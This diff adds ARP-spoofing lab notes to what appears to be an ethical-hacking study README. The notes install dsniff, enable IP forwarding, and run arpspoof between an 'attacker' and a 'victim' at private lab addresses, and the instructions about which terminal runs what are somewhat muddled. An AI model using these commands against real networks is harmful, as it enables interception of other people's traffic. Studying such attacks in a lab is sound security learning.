@@ -3,6 +3,49 @@
 
 ___
 
+## Arp Spoofing ##
+
+Installing arpspoof for linux.
+```bash
+sudo apt-get update
+```
+```bash
+sudo apt-get install dsniff
+```
+Make linux act as a "router" (man in the middle).
+Remove '#' commented line with the text: “net.ipv4.ip_forward = 1”.
+/etc/sysctl.conf
+```bash
+sudo nano /etc/sysctl.conf
+```
+Reconfigure the kernel parameters at runtime to apply the change.
+```bash
+sudo sysctl -p
+```
+
+On victim ubuntu:
+```bash
+sudo apt install net-tools
+```
+Check arp table. 
+```bash
+sudo arp -a
+```
+
+🔻On both attacker and victim terminals.
+
+🔺 Adjust ip addresses acordingly: 
+
+> in my setup: Attacker IP: 172.16.196.132 | Victim IP: 172.16.196.133
+> 
+```bash
+sudo arpspoof -i eth0 -t 172.16.196.133 172.16.196.132
+```
+```bash
+sudo arpspoof -i eth0 -t 172.16.196.132 172.16.196.133
+```
+___
+
 # Ethical Hacking: Wireless Networks
 
 ## Wireless Testing
